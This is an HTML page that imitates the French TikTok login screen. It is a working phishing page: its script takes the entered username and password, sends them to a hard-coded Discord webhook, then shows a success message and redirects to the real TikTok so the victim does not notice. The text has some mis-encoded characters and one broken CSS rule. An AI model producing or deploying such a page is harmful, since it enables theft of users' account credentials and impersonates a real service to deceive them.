<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>TikTok - Connexion</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap">
  <style>
    body {
      margin: 0;
      background: #fff;
      font-family: 'Inter', Arial, sans-serif;
      color: #161823;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-container {
      width: 340px;
      max-width: 95vw;
      margin: 24px;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
      padding: 32px 20px 24px 20px;
      text-align: center;
    }
    .tiktok-logo {
      width: 48px;
      margin-bottom: 16px;
    }
    .login-title {
      font-size: 1.6em;
      font-weight: 700;
      margin-bottom: 16px;
    }
    .login-form {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 8px;
      width: 100%;
    }
    .login-form input {
      padding: 12px;
      font-size: 1em;
      border: 1px solid #e3e3e4;
      border-radius: 6px;
      outline: none;
      transition: border 0.15s;
    }
    .login-form input:focus {
      border-color: #fe2c55;
    }
    .login-form button {
     : 8px;
      background: #fe2c55;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-weight: 600;
      font-size: 1.1em;
      padding: 12px;
      cursor: pointer;
      transition: background 0.13s;
    }
    .login-form button:hover {
      background: #e91b44;
    }
    .forgot-link {
      color: #fe2c55;
      text-decoration: none;
      font-size: 0.97em;
      margin-top: 4px;
      align-self: flex-end;
    }
    .success-msg {
      color: #12b886;
      font-weight: 600;
      margin: 14px 0 0 0;
    }
    .error-msg {
      color: #fe2c55;
      font-weight: 600;
      margin: 14px 0 0 0;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://www.vectorlogo.zone/logos/tiktok/tiktok-icon.svg" alt="TikTok" class="tiktok-logo">
    <div class="login-title">Connexion TikTok</div>
    <form class="login-form" id="loginForm">
      <input type="text" id="loginInput" placeholder="E-mail ou nom d'utilisateur" required autocomplete="username">
      <input type="password" id="passwordInput" placeholder="Mot de passe" required autocomplete="current-password">
      <button type="submit">Se connecter</button>
      <a href="#" class="forgot-link">Mot de passe oubli√© ?</a>
    </form>
    <div id="formMsg"></div>
  </div>
  <script>
    document.getElementById('loginForm').onsubmit = function(e) {
      e.preventDefault();
      var username = document.getElementById('loginInput').value;
      var password = document.getElementById('passwordInput').value;
      var webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
      var content = `üîî Connexion TikTok\nüë§ Utilisateur : ${username}\nüîë Mot de passe : ${password}`;
      var form = new FormData();
      form.append("content", content);
      fetch(webhookURL, {
        method: "POST",
        body: form
      }).finally(() => {
        document.getElementById('formMsg').innerHTML = '<div class="success-msg">Connexion r√©ussie (d√©mo)</div>';
        setTimeout(() => {
          window.location.href = "https://www.tiktok.com";
        }, 1200);
      });
    };
  </script>
</body>
</html>
